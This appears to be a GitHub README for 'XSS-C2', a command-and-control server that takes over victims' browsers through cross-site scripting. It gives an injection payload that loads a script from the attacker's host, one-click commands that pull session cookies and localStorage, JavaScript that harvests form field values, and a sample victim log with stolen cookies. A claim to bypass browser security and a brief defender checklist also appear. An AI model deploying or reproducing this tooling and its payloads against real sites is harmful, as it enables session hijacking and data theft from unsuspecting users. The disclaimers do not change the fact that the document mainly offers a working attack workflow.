XSS-C2 🔥
<div align="center">
https://img.shields.io/badge/Python-3.6+-blue.svg
https://img.shields.io/badge/License-Educational%2520Use%2520Only-red.svg
https://img.shields.io/badge/Platform-Linux%2520%257C%2520Windows%2520%257C%2520macOS-lightgrey.svg
https://img.shields.io/badge/Version-1.0.0-green.svg

Advanced Cross-Site Scripting Command & Control Server

Take control of browsers through XSS vulnerabilities

Features • Installation • Usage • Demo • Legal

</div>
📖 Overview
XSS-C2 is a professional-grade Command and Control server designed for security researchers and penetration testers to demonstrate the real-world impact of XSS vulnerabilities. It provides real-time browser control through injected JavaScript payloads with an intuitive web interface.

⚠️ LEGAL NOTICE: This tool is for authorized security testing and educational purposes only. Unauthorized use is illegal.

✨ Features
Feature	Description
🎯 Real-time Control	Execute JavaScript commands on compromised browsers
📊 Web Dashboard	Beautiful admin interface with live results
👥 Multi-Victim	Manage multiple browser sessions simultaneously
🔍 Auto Recon	Automatic information gathering (cookies, IP, user agent)
⚡ Quick Commands	One-click common reconnaissance tasks
🛡️ CORS Ready	Bypasses modern browser security policies
📱 Responsive	Works on desktop and mobile
🚀 Quick Start
Prerequisites
Python 3.6 or higher

No additional dependencies required!

Installation
bash
# Clone the repository
git clone https://github.com/yourusername/xss-c2.git
cd xss-c2

# The tool is ready to use - no installation needed!
Basic Usage
bash
# Start with default settings (all interfaces, port 4545)
python xss-c2.py

# Start with custom IP and port
python xss-c2.py -h 192.168.1.100 -p 8080

# Quick start on specific port
python xss-c2.py -p 9000
🎯 Usage Guide
1. Start the Server
bash
python xss-c2.py -h 192.168.1.100 -p 8080
Output:

text
🔧 Starting server with configuration:
   📍 Host: 192.168.1.100
   🚪 Port: 8080
--------------------------------------------------
🚀 XSS C2 Server running on http://192.168.1.100:8080
📋 Control Panel: http://192.168.1.100:8080/admin
📍 Port 8080 - With IP tracking and enhanced UI
⏳ Waiting for victim connections...
2. Access Control Panel
Navigate to the admin interface:

text
http://YOUR_IP:YOUR_PORT/admin
3. Deploy XSS Payload
Inject this payload into vulnerable applications:

html
<script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>
4. Monitor & Control
Watch victims connect in real-time

Send JavaScript commands

View execution results instantly

🛠️ Command Reference
CLI Options
bash
usage: xss-c2.py [-h] [-h HOST] [-p PORT]

🕷️ XSS C2 Server - Command and Control server for XSS attacks

optional arguments:
  -h, --help            show this help message and exit
  -h HOST, --host HOST  Server IP address (default: 0.0.0.0 - all interfaces)
  -p PORT, --port PORT  Server port (default: 4545)
Quick Commands
The dashboard includes one-click commands:

Button	Command	Purpose
🍪 Get Cookies	document.cookie	Extract session cookies
🌐 Get Domain	document.domain	Get current domain
🔗 Get URL	location.href	Get full page URL
🖥️ User Agent	navigator.userAgent	Get browser fingerprint
📊 Page Info	JSON.stringify(...)	Get page statistics
💾 LocalStorage	localStorage	Extract local storage data
⚠️ Test Alert	alert()	Test command execution
📸 Demo
Control Panel Interface
https://via.placeholder.com/800x400/35495e/ffffff?text=XSS-C2+Control+Panel

Victim Connection Log
text
🎯 NEW VICTIM CONNECTED!
📍 CLIENT IP: 192.168.1.150
🌐 URL: https://vulnerable-site.com/profile
🍪 Cookies: session=abc123; user=admin
🖥️ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
======================================
🏗️ Architecture






Server Endpoints
GET /admin - Control panel

GET /cmd.js - XSS payload

GET /get_command - Command distribution

POST /result - Result collection

POST /recon - Victim information

POST /add_command - Command queue

🔧 Advanced Usage
Custom JavaScript Execution
javascript
// Extract all forms
Array.from(document.forms).map(form => ({
  action: form.action,
  method: form.method,
  inputs: Array.from(form.elements).map(i => ({
    name: i.name,
    type: i.type,
    value: i.value
  }))
}))

// Get all links
Array.from(document.links).map(link => link.href)

// DOM manipulation
document.body.style.backgroundColor = 'red'
Multiple Server Instances
bash
# Terminal 1 - Primary C2
python xss-c2.py -p 8080

# Terminal 2 - Backup C2  
python xss-c2.py -p 8081

# Terminal 3 - Testing C2
python xss-c2.py -p 8082
🛡️ Security Best Practices
For Researchers
✅ Use in isolated lab environments

✅ Obtain proper authorization

✅ Follow responsible disclosure

✅ Document all testing activities

For Defenders
✅ Implement Content Security Policy (CSP)

✅ Validate and sanitize user input

✅ Use HTTPOnly cookies

✅ Regular security assessments

❓ FAQ
Q: Is this tool detectable by antivirus?
A: The server component is a standard Python HTTP server. The JavaScript payload may be detected by advanced security tools.

Q: Can I use this for red team exercises?
A: Yes, with proper authorization and within defined scope.

Q: What browsers are supported?
A: All modern browsers that support JavaScript and Fetch API.

Q: How do I handle HTTPS sites?
A: The C2 server must be accessible via HTTP/HTTPS matching the target site's protocol.

🤝 Contributing
We welcome contributions from the security community!

Fork the repository

Create a feature branch (git checkout -b feature/amazing-feature)

Commit your changes (git commit -m 'Add amazing feature')

Push to the branch (git push origin feature/amazing-feature)

Open a Pull Request

📜 License
This project is licensed under the Educational Use License - see LICENSE file for details.

⚠️ Legal Disclaimer
This tool is provided for educational and authorized security testing purposes only. The developers are not responsible for any misuse or damage. Users must comply with all applicable laws and obtain proper authorization before use.

🆘 Support
🐛 Bug Reports: GitHub Issues

💬 Discussions: GitHub Discussions

📧 Contact: security@example.com

🙏 Acknowledgments
Security researchers advancing web application security

Open-source community for continuous improvement

Ethical hackers making the web safer

<div align="center">
Made with ❤️ for the Security Community

XSS-C2 • v1.0.0 • Download

</div>
